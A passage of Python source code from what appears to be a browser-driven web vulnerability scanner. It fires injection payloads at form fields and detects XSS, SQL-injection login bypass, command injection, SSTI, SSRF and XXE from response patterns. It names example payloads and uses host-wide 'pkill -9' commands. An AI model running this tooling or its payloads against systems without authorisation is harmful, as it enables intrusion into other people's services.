                                    ignore_https_errors=True),
                                timeout=10.0)
                            if saved_cookies:
                                await asyncio.wait_for(context.add_cookies(saved_cookies), timeout=5.0)
                            contexts_created += 1
                            # Clear the poison set — new context means
                            # all old pages are gone, so any poison entries
                            # for them are stale (and their UUIDs won't
                            # match the new pages anyway, but clearing
                            # keeps the set from growing unboundedly).
                            _POISONED_PAGES.clear()
                            self.logger.log("context_recycled",
                                           f"browser restarted (#{contexts_created}) — {len(saved_cookies)} cookies")

                        # Create page
                        test_page = await asyncio.wait_for(context.new_page(), timeout=5.0)
                        # Assign a unique ID to this page so _pw() can
                        # track poison state without id() reuse bugs.
                        test_page._webrecon_uid = uuid.uuid4().hex
                        # Verify page is alive
                        await asyncio.wait_for(test_page.set_content("<html></html>"), timeout=3.0)
                        # Page works — break out of retry loop
                        break
                    except Exception as e:
                        self.logger.log("active_inject_error",
                                       f"attempt {attempt+1}/3 failed: {type(e).__name__}: {e}")
                        test_page = None
                        context = None  # force full restart on next attempt
                        if attempt < 2:
                            self.logger.log("active_inject_error", f"retrying (attempt {attempt+2}/3)...")
                        continue

                if test_page is None:
                    self.logger.log("active_inject_error",
                                   f"giving up on test {tests_done} after 3 attempts — skipping")
                    continue

                # Attach the request/response capture handlers to this test page.
                # These are defined per-page so the capture buffer is isolated.
                last_request: Dict[str, Any] = {}
                last_response: Dict[str, Any] = {}

                def _on_request(req: PWRequest,
                                _buf: Dict[str, Any] = last_request) -> None:
                    if req.url == _buf.get("_expected_url", ""):
                        _buf["method"] = req.method
                        _buf["url"] = req.url
                        _buf["headers"] = dict(req.headers)
                        try:
                            _buf["post_data"] = req.post_data or ""
                        except Exception:
                            _buf["post_data"] = ""

                async def _on_response(resp: PWResponse,
                                       _buf: Dict[str, Any] = last_response) -> None:
                    # Match by URL prefix (ignore query strings) OR capture
                    # any POST response (form submission may go to a different URL).
                    expected = _buf.get("_expected_url", "")
                    url_matches = (resp.url == expected or
                                  resp.url.startswith(expected + "?") or
                                  resp.url.split("?")[0] == expected)
                    is_post = (resp.request and resp.request.method == "POST")
                    if url_matches or is_post:
                        _buf["status"] = resp.status
                        _buf["url"] = resp.url
                        try:
                            _buf["headers"] = dict(await resp.all_headers())
                        except Exception:
                            _buf["headers"] = {}
                        try:
                            _buf["body"] = await resp.text()
                        except Exception:
                            _buf["body"] = ""

                test_page.on("request", _on_request)
                test_page.on("response", lambda r: asyncio.create_task(_on_response(r)))

                # Also attach the dialog auto-dismiss handler — critical for
                # payloads like <script>alert(1)</script> that actually execute.
                def _on_dialog(dialog: Any) -> None:
                    try:
                        self.logger.log(
                            "js_dialog_dismissed",
                            f"type={dialog.type} message={dialog.message[:200]!r} "
                            f"(payload likely executed — verify in evidence)",
                        )
                        asyncio.create_task(dialog.dismiss())
                    except Exception as e:
                        self.logger.log("js_dialog_error", f"failed to dismiss dialog: {e}")
                test_page.on("dialog", _on_dialog)

                # --- Suppress repeated JS errors ---
                # Some target pages have broken JS (jQuery not loaded, etc.)
                # that fires the SAME error on every page load. We track
                # seen errors and only log the FIRST occurrence — otherwise
                # the trail gets flooded with hundreds of identical
                # "js_pageerror" entries that aren't useful for the engineer.
                _seen_js_errors: set = set()
                def _on_pageerror(err: Any) -> None:
                    try:
                        err_str = str(err)[:300]
                        # Create a fingerprint (first 100 chars) to dedup
                        fingerprint = err_str[:100]
                        if fingerprint in _seen_js_errors:
                            return  # already logged this error — skip
                        _seen_js_errors.add(fingerprint)
                        self.logger.log("js_pageerror", err_str)
                    except Exception:
                        pass
                test_page.on("pageerror", _on_pageerror)

                # --- Run the injection on the fresh test_page ---
                # Wrap in a HARD 30s cap. If the test hangs (javascript: URI,
                # infinite loop, etc.), we abandon it and discard the page.
                # We do NOT call test_page.close() on timeout because close()
                # itself might hang on a stuck page — we just let the page be
                # garbage-collected (or closed by the context at scan end).
                finding: Optional[Finding] = None
                test_timed_out = False

                # WATCHDOG TIMER: Start a separate OS thread that will
                # pkill Chrome after 60s regardless of what the main loop
                # is doing. This is the CRITICAL fix for the freeze.
                #
                # When Playwright's C code hangs, it blocks the ENTIRE
                # asyncio event loop — asyncio.wait_for's timeout callback
                # NEVER FIRES because the event loop can't run. The watchdog
                # thread is a plain OS thread that doesn't need the event
                # loop — it just sleeps 60s then kills Chrome.
                #
                # When Chrome is killed, the Playwright C call that was
                # blocking returns with an error (TargetClosedError),
                # which unblocks the main loop. The main loop then hits
                # the except clause, sets test_timed_out=True, and the
                # timeout_browser_kill code restarts the browser.
                #
                # CRITICAL: The watchdog MUST be cancelled when the test
                # completes. Otherwise it fires 60s later and kills
                # whatever browser is currently running — causing the
                # "TargetClosedError cascade" where every test after the
                # first 60s dies, retries, dies again.
                #
                # We use a threading.Event for cancellation. The watchdog
                # sleeps on event.wait(60) instead of time.sleep(60).
                # If the test completes, we set the event, which wakes
                # the watchdog immediately. The watchdog checks if it was
                # cancelled (event.is_set()) and exits WITHOUT killing.
                #
                # DISABLED when self.no_watchdog is True.
                import threading as _threading_mod
                watchdog_fired = [False]  # mutable container for the thread
                watchdog_cancel = _threading_mod.Event()  # cancellation signal

                if not self.no_watchdog:
                    def _watchdog():
                        # Sleep 60s, but wake immediately if cancelled.
                        # event.wait() returns True if set (cancelled),
                        # False if the timeout expired (should fire).
                        if watchdog_cancel.wait(timeout=60.0):
                            return  # cancelled — test completed, don't fire
                        watchdog_fired[0] = True
                        # Kill Chrome at the OS level — this will cause the
                        # blocked Playwright C call to return with an error
                        import subprocess as _sp
                        _sp.run("pkill -9 -f chromium; pkill -9 -f chrome; pkill -9 -f headless; pkill -9 -f chrome-headless-shell; pkill -9 -f remote-debugging-pipe", shell=True, timeout=5, capture_output=True)

                    watchdog_thread = _threading_mod.Thread(target=_watchdog, daemon=True)
                    watchdog_thread.start()

                try:
                    finding = await asyncio.wait_for(
                        self._inject_and_check(
                            test_page, inp, payload,
                            last_request, last_response,
                        ),
                        timeout=120.0,  # 120s — watchdog kills at 60s anyway
                    )
                except asyncio.TimeoutError:
                    test_timed_out = True
                    self.logger.log(
                        "active_inject_timeout",
                        f"test abandoned after 120s — "
                        f"input={inp.name} payload_idx={payload_idx} "
                        f"url={inp.url} payload={payload[:60]!r}"
                        f" (KILLING Chrome to break Playwright deadlock)",
                    )
                    finding = None
                except Exception as e:
                    if watchdog_fired[0]:
                        # The watchdog killed Chrome, which caused this exception
                        test_timed_out = True
                        self.logger.log(
                            "active_inject_timeout",
                            f"watchdog killed Chrome after 60s — "
                            f"input={inp.name} payload_idx={payload_idx} "
                            f"url={inp.url} payload={payload[:60]!r}"
                            f" (error: {type(e).__name__})",
                        )
                        finding = None
                    else:
                        self.logger.log(
                            "active_inject_error",
                            f"input={inp.name} payload_idx={payload_idx} "
                            f"error={type(e).__name__}: {e}",
                        )
                        finding = None

                # --- CANCEL THE WATCHDOG ---
                # The test completed (success, timeout, or error). The
                # watchdog thread is either:
                #   - Still sleeping (test took <60s) → cancel it so it
                #     doesn't fire 60s later and kill the NEXT test's browser
                #   - Already fired (test took >60s) → setting the event
                #     is a no-op (the thread already exited)
                #
                # This is the fix for the "TargetClosedError cascade"
                # where every test after the first 60s dies because old
                # watchdog threads fire and kill the current browser.
                watchdog_cancel.set()

                # --- Close the test page (ALWAYS, even on timeout) ---
                # CRITICAL: We MUST close every page, even stuck ones. If we
                # leave orphaned pages, after ~460 tests the browser runs out
                # of resources (memory, file descriptors, max pages per context)
                # and context.new_page() starts hanging — which causes the
                # "freeze at 460" bug the user reported.
                #
                # Two-tier close strategy:
                #   1. AWAIT `_quick_close_page()` with a 1.5s timeout.
                #      For ~95% of pages (payload executed cleanly, no
                #      active JS, no in-flight requests), close() returns
                #      in <100ms. We await so we KNOW the page is gone
                #      before creating the next one — no orphan accumulation.
                #   2. If the quick close times out (page is busy — active
                #      script, hanging request, open dialog), fire-and-forget
                #      `_safe_close_page()` as a background task. That runs
                #      the full graceful ladder: goto("about:blank") to stop
                #      all JS + abort in-flight requests, THEN close(). The
                #      ladder has a 4s total timeout, but it runs in the
                #      background so it doesn't block the main scan loop.
                #   3. If even the graceful ladder fails (zombie renderer),
                #      the page is abandoned — the BrowserContext will
                #      force-close it at scan end, and the retry loop will
                #      pkill Chrome if too many pages accumulate.
                #
                # CRITICAL FIX: Do NOT fire-and-forget _safe_close_page
                # as a background task. If many pages get stuck (infinite
                # JS loops, hanging requests), these background tasks
                # accumulate and hold browser resources (memory, CDP
                # connections, file descriptors). Eventually the browser's
                # internal connection pool is exhausted and new_page()
                # blocks forever — the "freeze at 200-500 tests" bug.
                #
                # Instead, we AWAIT _safe_close_page with a hard 3s
                # timeout. If it doesn't close in 3s, we discard the
                # page and rely on the context recycle (every 20 tests)
                # to kill the entire browser and start fresh.
                if test_page is not None:
                    closed = await _quick_close_page(test_page)
                    if not closed:
                        # Page is busy — await the graceful shutdown
                        # with a hard 3s timeout. If it doesn't finish,
                        # just move on (the context recycle will pkill
                        # Chrome and clean everything up).
                        try:
                            await asyncio.wait_for(
                                _safe_close_page(test_page), timeout=3.0)
                        except asyncio.TimeoutError:
                            # Graceful shutdown took too long — abandon
                            # the page. The context recycle (every 20
                            # tests) will pkill Chrome and start fresh.
                            pass
                        except Exception:
                            pass

                # --- IF THE TEST TIMED OUT: immediately kill Chrome + restart ---
                # This is the CRITICAL fix for the "freeze at 97/305/320/410" bug.
                #
                # When asyncio.wait_for cancels the _inject_and_check coroutine
                # at 30s, it cancels the PYTHON coroutine but NOT the Playwright
                # C call underneath. The Playwright connection is now PERMANENTLY
                # BUSY — every subsequent call (including context.new_page() for
                # the next test) also hangs. The 5s timeout on new_page() fires,
                # we continue to the next test, new_page() hangs again → infinite
                # loop of 5s hangs that looks like a freeze.
                #
                # The ONLY way to break this cycle is to KILL Chrome at the OS
                # level (pkill) and create a fresh browser. This takes ~3-5s
                # but guarantees the next test starts with a clean browser.
                if test_timed_out:
                    self.logger.log(
                        "timeout_browser_kill",
                        f"test timed out — killing Chrome + restarting browser "
                        f"to prevent Playwright connection deadlock",
                    )
                    try:
                        import subprocess as _sp
                        _sp.run("pkill -9 -f chromium; pkill -9 -f chrome; pkill -9 -f headless; pkill -9 -f chrome-headless-shell; pkill -9 -f remote-debugging-pipe", shell=True, timeout=5, capture_output=True)
                        # Small delay to let OS clean up
                        await asyncio.sleep(1.0)
                        # Try to close the old browser cleanly (may fail — that's OK)
                        try:
                            if browser is not None:
                                await asyncio.wait_for(browser.close(), timeout=3.0)
                        except Exception:
                            pass
                        # Launch a fresh browser
                        pw = GLOBAL_STATE.playwright_ctx
                        if pw is not None:
                            # Save cookies before restarting
                            try:
                                saved_cookies = await asyncio.wait_for(
                                    context.cookies(), timeout=3.0)
                            except Exception:
                                saved_cookies = initial_cookies
                            browser = await asyncio.wait_for(
                                pw.chromium.launch(
                                    headless=True,
                                    args=["--disable-background-timer-throttling",
                                          "--disable-renderer-backgrounding",
                                          "--disable-background-networking"],
                                ),
                                timeout=15.0,
                            )
                            GLOBAL_STATE.browser = browser
                            context = await asyncio.wait_for(
                                browser.new_context(
                                    user_agent=("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                                                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
                                    viewport={"width": 1280, "height": 720},
                                    ignore_https_errors=True,
                                ),
                                timeout=10.0,
                            )
                            if saved_cookies:
                                await asyncio.wait_for(
                                    context.add_cookies(saved_cookies), timeout=5.0)
                            contexts_created += 1
                            self.logger.log(
                                "timeout_browser_restarted",
                                f"browser restarted after timeout (#{contexts_created}) — "
                                f"{len(saved_cookies)} cookies restored",
                            )
                    except Exception as e:
                        self.logger.log(
                            "timeout_browser_kill_failed",
                            f"failed to restart browser after timeout: {type(e).__name__}: {e}",
                        )

                if finding is not None:
                    findings.append(finding)

                # Update progress watchdog — this test completed (success or fail)
                last_progress_time[0] = time.time()
                # Write heartbeat for the external supervisor. This is
                # the KEY line — if the scanner hangs on the NEXT test,
                # the supervisor will detect the stale heartbeat and
                # restart with --resume --skip-tests=tests_done.
                _write_heartbeat(tests_done, total_tests, phase="active")

        # ===================================================================
        # MULTI-FIELD INJECTION PASS
        # ===================================================================
        # After testing each field individually, we do a SECOND pass where
        # we inject the payload into ALL fields on the same form simultaneously.
        #
        # WHY: Some vulnerabilities only trigger when ALL fields are populated:
        #   - SQLi on login forms that require both username + password
        #   - Business logic flaws (price + quantity manipulation)
        #   - Mass assignment vulnerabilities
        #   - Forms with client-side validation that blocks submission
        #     if ANY required field is empty
        #
        # The single-field pass (above) tests each field in isolation.
        # The multi-field pass (below) tests all fields together.
        #
        # We group inputs by their URL (forms on the same page) and inject
        # the SAME payload into every field on that form. This doubles the
        # number of tests but catches vulnerabilities the single-field
        # pass misses.

        # --- Group inputs by URL (each URL = one form/page) ---
        form_groups: Dict[str, List[InputField]] = {}
        for inp in inputs:
            url_key = inp.url.split("?")[0]  # ignore query string
            if url_key not in form_groups:
                form_groups[url_key] = []
            form_groups[url_key].append(inp)

        # Only do multi-field injection for forms with 2+ fields
        multi_field_forms = {url: inps for url, inps in form_groups.items()
                            if len(inps) >= 2}

        # CRITICAL: Do NOT run the multi-field pass if the scan was
        # paused (session expiry, stop button, etc.). The single-field
        # loop above broke out due to stop_event — the multi-field pass
        # must also skip. Otherwise the scan "completes" with only
        # partial results when it should have paused for re-login.
        if multi_field_forms and not GLOBAL_STATE.stop_event.is_set():
            multi_field_tests = sum(len(self.payloads) for _ in multi_field_forms)
            self.logger.log(
                "multi_field_start",
                f"starting multi-field injection: {len(multi_field_forms)} forms "
                f"with 2+ fields, {multi_field_tests} additional tests"
            )

            # Separate counter for multi-field tests (the single-field
            # tests_done counter doesn't increment here). Used by the
            # heartbeat so the supervisor can detect progress.
            mf_tests_done = 0

            for form_url, form_inputs in multi_field_forms.items():
                if GLOBAL_STATE.stop_event.is_set():
                    break
                for payload_idx, payload in enumerate(self.payloads):
                    if GLOBAL_STATE.stop_event.is_set():
                        break

                    # Skip payloads that are just text (no injection chars)
                    # — multi-field is most valuable for injection payloads.
                    if not any(c in payload for c in "<'\"{;$|"):
                        continue

                    test_id = uuid.uuid4().hex[:12]
                    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
                    self.logger.log(
                        "multi_field_inject",
                        f"test_id={test_id} url={form_url} "
                        f"fields={[i.name for i in form_inputs]} "
                        f"payload={payload[:60]!r}"
                    )

                    # Create a fresh page for this test
                    pages_created += 1
                    if not self.no_watchdog and pages_created % CONTEXT_RECYCLE_INTERVAL == 0 and browser is not None:
                        try:
                            current_cookies = await asyncio.wait_for(
                                context.cookies(), timeout=5.0
                            )
                            await asyncio.wait_for(context.close(), timeout=10.0)
                            context = await asyncio.wait_for(
                                browser.new_context(
                                    user_agent=("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                                                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
                                    viewport={"width": 1280, "height": 720},
                                    ignore_https_errors=True,
                                ),
                                timeout=10.0,
                            )
                            if current_cookies:
                                await asyncio.wait_for(
                                    context.add_cookies(current_cookies),
                                    timeout=5.0,
                                )
                            contexts_created += 1
                            self.logger.log("context_recycled",
                                          f"new context (#{contexts_created}) — multi-field pass")
                        except Exception as e:
                            self.logger.log("context_recycle_error", str(e)[:200])

                    test_page: Optional[Page] = None
                    try:
                        test_page = await asyncio.wait_for(context.new_page(), timeout=5.0)
                    except Exception as e:
                        self.logger.log("active_inject_error",
                                        f"multi-field: failed to create page: {e}")
                        continue

                    # Attach handlers
                    last_request: Dict[str, Any] = {}
                    last_response: Dict[str, Any] = {}

                    def _on_request_mf(req: PWRequest,
                                       _buf: Dict[str, Any] = last_request) -> None:
                        if req.url == _buf.get("_expected_url", ""):
                            _buf["method"] = req.method
                            _buf["url"] = req.url
                            _buf["headers"] = dict(req.headers)
                            try:
                                _buf["post_data"] = req.post_data or ""
                            except Exception:
                                _buf["post_data"] = ""

                    async def _on_response_mf(resp: PWResponse,
                                              _buf: Dict[str, Any] = last_response) -> None:
                        if resp.url == _buf.get("_expected_url", ""):
                            _buf["status"] = resp.status
                            _buf["url"] = resp.url
                            try:
                                _buf["headers"] = dict(await resp.all_headers())
                            except Exception:
                                _buf["headers"] = {}
                            try:
                                _buf["body"] = await resp.text()
                            except Exception:
                                _buf["body"] = ""

                    test_page.on("request", _on_request_mf)
                    test_page.on("response", lambda r: asyncio.create_task(_on_response_mf(r)))

                    def _on_dialog_mf(dialog: Any) -> None:
                        try:
                            self.logger.log("js_dialog_dismissed",
                                          f"type={dialog.type} message={dialog.message[:100]!r}")
                            asyncio.create_task(dialog.dismiss())
                        except Exception:
                            pass
                    test_page.on("dialog", _on_dialog_mf)

                    # Run the multi-field injection
                    finding: Optional[Finding] = None
                    test_timed_out = False
                    try:
                        finding = await asyncio.wait_for(
                            self._inject_and_check_multi(
                                test_page, form_inputs, payload,
                                last_request, last_response,
                            ),
                            timeout=120.0,  # 120s — matches single-field path
                        )
                    except asyncio.TimeoutError:
                        test_timed_out = True
                        self.logger.log("active_inject_timeout",
                                        f"multi-field test abandoned after 120s — "
                                        f"url={form_url} payload_idx={payload_idx}")
                        finding = None
                    except Exception as e:
                        self.logger.log("active_inject_error",
                                        f"multi-field error: {type(e).__name__}: {e}")
                        finding = None

                    # Close the page (ALWAYS — even on timeout, even on error).
                    # Same two-tier strategy as the single-field path:
                    #   1. AWAIT _quick_close_page() with 1.5s timeout (95% case)
                    #   2. If busy, fire-and-forget _safe_close_page() which
                    #      does goto("about:blank") + close() (the graceful
                    #      shutdown ladder).
                    # Previously this only closed on success (!test_timed_out),
                    # which leaked every timed-out page — a significant
                    # resource leak in the multi-field pass.
                    #
                    # CRITICAL FIX: Do NOT fire-and-forget _safe_close_page
                    # as a background task (same fix as single-field path).
                    # Await it with a hard 3s timeout instead.
                    if test_page is not None:
                        closed = await _quick_close_page(test_page)
                        if not closed:
                            try:
                                await asyncio.wait_for(
                                    _safe_close_page(test_page), timeout=3.0)
                            except asyncio.TimeoutError:
                                pass
                            except Exception:
                                pass

                    if finding is not None:
                        findings.append(finding)

                    # Write heartbeat for the external supervisor.
                    # Uses mf_tests_done (multi-field counter) since
                    # tests_done only counts single-field tests.
                    mf_tests_done += 1
                    _write_heartbeat(
                        tests_done + mf_tests_done,
                        total_tests + multi_field_tests,
                        phase="multi_field",
                    )

            self.logger.log("multi_field_done",
                           f"multi-field injection complete — {len(findings)} total findings")

        return findings

    async def _inject_and_check_multi(
        self,
        page: Page,
        form_inputs: List[InputField],
        payload: str,
        last_request: Dict[str, Any],
        last_response: Dict[str, Any],
    ) -> Optional[Finding]:
        """Inject the SAME payload into ALL fields on a form simultaneously.

        This catches vulnerabilities that only trigger when all fields are
        populated — e.g. SQLi on login forms that require both username
        and password, or business logic flaws.
        """
        test_id = uuid.uuid4().hex[:12]
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
        ev_file = self.evidence_dir / f"{timestamp}_{test_id}_multifield.txt"
        trail: List[str] = []

        # All inputs share the same URL (grouped by URL)
        form_url = form_inputs[0].url
        expected_url = form_url.split("?")[0]
        last_request.clear()
        last_response.clear()
        last_request["_expected_url"] = expected_url
        last_response["_expected_url"] = expected_url

        trail.append(f"[Step 1] Navigated to {form_url}")
        self.logger.log("active_inject",
                        f"test_id={test_id} url={form_url} "
                        f"input=MULTI({','.join(i.name for i in form_inputs)}) "
                        f"location=form payload_type={'SQLi' if chr(39) in payload else 'XSS' if '<' in payload else 'Other'}",
                        payload=payload)

        async with self.rate_limiter.slot():
            # CRITICAL: Clear cookies before testing login/register forms.
            # If a previous XSS payload accidentally created an account (e.g.
            # on /register), the browser would be logged in. When we then test
            # /login, the server redirects to the dashboard (already logged in)
            # and the SQLi payload never reaches the login query.
            # Fix: clear cookies so we're always "logged out" when testing
            # login/register forms.
            form_url_lower = form_url.lower()
            is_login_or_register = any(kw in form_url_lower for kw in
                                       ("/login", "/signin", "/sign-in",
                                        "/register", "/signup", "/sign-up",
                                        "/auth", "/account/login"))
            if is_login_or_register:
                try:
                    await _pw(page.context.clear_cookies, default=None)
                    trail.append("[Step 1a] Cleared cookies (login/register form — ensures logged-out state)")
                except Exception:
                    pass

            # Navigate to the form page
            try:
                await _pw(page.goto, form_url, wait_until="domcontentloaded",
                          timeout=15000, default=None)
            except Exception as e:
                self.logger.log("active_inject", f"multi-field navigation failed: {e}")
                return None

            # Fill ALL fields with the payload
            filled_fields = []
            for inp in form_inputs:
                if inp.location != "form":
                    continue  # only fill form fields
                selector = (
                    f"input[name='{inp.name}'], "
                    f"textarea[name='{inp.name}'], "
                    f"select[name='{inp.name}']"
                )
                try:
                    elem = await _pw(page.query_selector, selector, default=None)
                    if elem is not None:
                        is_visible = await _pw(elem.is_visible, default=False)
                        if is_visible:
                            await _pw(elem.fill, payload, default=None)
                            filled_fields.append(inp.name)
                        else:
                            # Hidden field — set via JS
                            await _pw(page.evaluate,
                                """(args) => {
                                    const el = document.querySelector(args.selector);
                                    if (el) { el.value = args.value; }
                                }""",
                                {"selector": selector, "value": payload},
                                default=None,
                            )
                            filled_fields.append(inp.name + "(hidden)")
                except Exception as e:
                    self.logger.log("active_inject",
                                    f"multi-field: failed to fill '{inp.name}': {e}")

            trail.append(f"[Step 2] Filled {len(filled_fields)} fields: {', '.join(filled_fields)}")

            # Submit the form
            try:
                submit_btn = await _pw(page.query_selector,
                    "button[type=submit], input[type=submit], button:not([type])",
                    default=None,
                )
                if submit_btn:
                    await _pw(submit_btn.click, no_wait_after=True, default=None)
                else:
                    await _pw(page.keyboard.press, "Enter", default=None)
                trail.append("[Step 3] Submitted form")
                try:
                    await _pw(page.wait_for_load_state, "domcontentloaded",
                              timeout=15000, default=None)
                except Exception:
                    self.logger.log("active_inject_timeout",
                                    "multi-field submit load timed out — proceeding")
                await asyncio.sleep(0.3)
            except Exception as e:
                self.logger.log("active_inject", f"multi-field submit failed: {e}")
                # Try JS submit
                try:
                    await _pw(page.evaluate,
                        """() => {
                            const form = document.querySelector('form');
                            if (form) form.submit();
                        }""",
                        default=None,
                    )
                    await asyncio.sleep(0.3)
                    trail.append("[Step 3] Submitted form (via JS)")
                except Exception:
                    return None

        # Get the response body
        body = last_response.get("body", "") or ""
        try:
            rendered_html = await _pw(page.content, default="")
        except Exception:
            rendered_html = ""
        combined = "===HTTP RESPONSE BODY===\n" + body + "\n===RENDERED DOM===\n" + rendered_html

        # Check for session expiry (unless --ignore-session-expiry)
        if not self.ignore_session_expiry:
            response_status = last_response.get("status", 200)
            response_headers = last_response.get("headers", {}) or {}
            content_type = str(response_headers.get("content-type", "")).lower()
            is_html = "text/html" in content_type or not content_type
            inp_url_lower = form_url.lower()
            is_testing_login_page = any(kw in inp_url_lower for kw in
                                        ("/login", "/signin", "/sign-in",
                                         "/auth", "/account/login"))
            session_expired = False
            if not is_testing_login_page:
                if response_status == 401:
                    session_expired = True
                elif response_status in (301, 302, 303, 307, 308):
                    location = str(response_headers.get("location", "")).lower()
                    if any(kw in location for kw in ("login", "signin", "sign-in", "auth")):
                        session_expired = True
                elif response_status == 200 and is_html and self.is_authenticated:
                    if self.LOGIN_KEYWORDS.search(body):
                        session_expired = True
            if session_expired:
                self.logger.log("session_expired",
                                f"multi-field: session expired on {form_url}")
                GLOBAL_STATE.interrupted = True
                GLOBAL_STATE.stop_event.set()
                return None

        # Run pattern matchers
        patterns_matched: List[str] = []
        if "<" in payload or "javascript:" in payload.lower():
            for label, pat in XSS_REFLECTION_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"XSS:{label}")
        if "'" in payload or "--" in payload or " or " in payload.lower():
            # --- Error-based SQLi (existing) ---
            for label, pat in SQLI_ERROR_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"SQLi:{label}")

            # --- Auth bypass SQLi (NEW) ---
            # If the payload looks like a SQLi auth bypass (e.g. admin' --,
            # ' OR '1'='1, ' OR 1=1) and the response indicates successful
            # login (redirect to dashboard, "welcome", "logout" link), this
            # is a SQLi auth bypass — even without a SQL error message.
            payload_lower = payload.lower()
            looks_like_sqli_bypass = (
                ("--" in payload_lower) or
                (" or " in payload_lower) or
                ("'1'='1" in payload_lower) or
                ("' or 1=1" in payload_lower) or
                ("admin'" in payload_lower)
            )
            if looks_like_sqli_bypass:
                # Check for auth bypass indicators in the response.
                # 1. Response URL changed from /login to something else
                resp_url = str(last_response.get("url", "")).lower()
                inp_url_lower = inp.url.lower()
                is_login_page = any(kw in inp_url_lower for kw in
                                    ("/login", "/signin", "/sign-in", "/auth"))
                redirected_from_login = (is_login_page and
                                        resp_url and
                                        not any(kw in resp_url for kw in
                                                ("/login", "/signin", "/sign-in")))
                # 2. Response contains success indicators
                success_keywords = [
                    "welcome", "logout", "sign out", "dashboard", "my account",
                    "logged in", "login successful", "you are now logged in",
                    "welcome back", "hello,", "profile", "settings",
                ]
                has_success_keyword = any(kw in combined.lower() for kw in success_keywords)
                # 3. Response does NOT contain failure indicators
                failure_keywords = [
                    "invalid", "incorrect", "wrong", "failed", "error",
                    "not found", "does not exist", "try again",
                ]
                has_failure_keyword = any(kw in combined.lower() for kw in failure_keywords)
                # 4. Response status is 200 (not 302 redirect to login)
                resp_status_val = last_response.get("status", 200)

                if (redirected_from_login or has_success_keyword) and not has_failure_keyword:
                    patterns_matched.append("SQLi:auth_bypass")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern=auth_bypass "
                        f"url={inp.url} input={inp.name} "
                        f"redirected={redirected_from_login} "
                        f"success_kw={has_success_keyword}",
                        payload=payload,
                    )
                elif has_success_keyword and resp_status_val == 200:
                    # Even with a failure keyword, if success keywords are
                    # present too (e.g. "Invalid credentials. Welcome back!"),
                    # flag it as a potential bypass.
                    patterns_matched.append("SQLi:potential_bypass")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern=potential_bypass "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )

            # --- UNION-based SQLi (NEW) ---
            # If the payload contains UNION SELECT and the response is
            # significantly larger than expected (extra data from UNION),
            # or contains database-specific output (column names, table names,
            # data types), flag it.
            if "union" in payload_lower and "select" in payload_lower:
                union_indicators = [
                    "information_schema", "mysql.user", "pg_user",
                    "sysobjects", "syscolumns", "all_tables", "user_tables",
                    "password_hash", "user_password", "tbl_", "col_",
                ]
                has_union_indicator = any(kw in combined.lower() for kw in union_indicators)
                if has_union_indicator:
                    patterns_matched.append("SQLi:union_data_exposure")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern=union_data_exposure "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )

            # --- Time-based SQLi (NEW) ---
            # If the payload contains SLEEP or BENCHMARK and the response
            # took significantly longer than normal, flag it.
            if "sleep(" in payload_lower or "benchmark(" in payload_lower:
                # We can't measure exact response time here (the response
                # handler doesn't record timestamps), but if the payload
                # contains SLEEP and the response succeeded (no error),
                # it's worth flagging for manual verification.
                if not has_failure_keyword:
                    patterns_matched.append("SQLi:time_based_possible")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern=time_based_possible "
                        f"url={inp.url} input={inp.name} "
                        f"(payload contains SLEEP/BENCHMARK — verify response time manually)",
                        payload=payload,
                    )
        if "../" in payload or "..\\" in payload:
            for label, pat in PATH_TRAVERSAL_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"PathTraversal:{label}")
        if ";" in payload or "|" in payload or "$(" in payload:
            for label, pat in CMD_INJECTION_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"CMDi:{label}")
            # Echo-canary: reliable cross-platform CMDi signal (catches
            # embedded/Windows output the whoami regexes miss).
            if _cmdi_echo_canary_hit(payload, combined):
                patterns_matched.append("CMDi:echo_canary")
        if "{{" in payload or "${" in payload or "#{" in payload or "<%=" in payload:
            payload_patterns_to_check = []
            if "{{" in payload: payload_patterns_to_check.append(("{{", "}}"))
            if "${" in payload: payload_patterns_to_check.append(("${", "}"))
            if "#{" in payload: payload_patterns_to_check.append(("#{", "}"))
            if "<%=" in payload: payload_patterns_to_check.append(("<%=", "%>"))
            for open_tok, close_tok in payload_patterns_to_check:
                literal = f"{open_tok}7*7{close_tok}"
                if literal not in combined and "49" in combined and "49" not in payload:
                    patterns_matched.append("SSTI:evaluated_49")
                    break
        # SSRF checks (URL / internal-fetch payloads) — reflection/metadata.
        if (payload.startswith(("http://", "https://", "file://", "dict://", "gopher://"))
                or "169.254" in payload or payload.startswith("//")):
            for label, pat in SSRF_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"SSRF:{label}")
        # XXE checks (XML payloads). NB: the multi-field path form-encodes the
        # payload, so XXE usually won't fire here — the single-field injector's
        # raw-XML-POST path is what actually tests XXE. The gate is harmless.
        _pls = payload.lstrip()
        if _pls.startswith("<?xml") or "<!DOCTYPE" in payload or "<!ENTITY" in payload:
            for label, pat in XXE_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"XXE:{label}")
        # CSS injection (multi-field): payload reflected into <style>/style=.
        css_ctx_mf = css_injection_context(payload, combined)
        if css_ctx_mf:
            patterns_matched.append(f"CSSInjection:{css_ctx_mf}")

        # Save evidence
        raw_evidence = (
            f"# Multi-field injection evidence\n"
            f"# Generated: {datetime.now(timezone.utc).isoformat()}\n"
            f"# Form URL: {form_url}\n"
            f"# Fields filled: {', '.join(filled_fields)}\n"
            f"# Payload (same in all fields): {payload}\n"
            f"# Patterns matched: {', '.join(patterns_matched) or 'none'}\n\n"
            f"=== HTTP RESPONSE ===\n"
            f"Status: {last_response.get('status', '?')}\n"
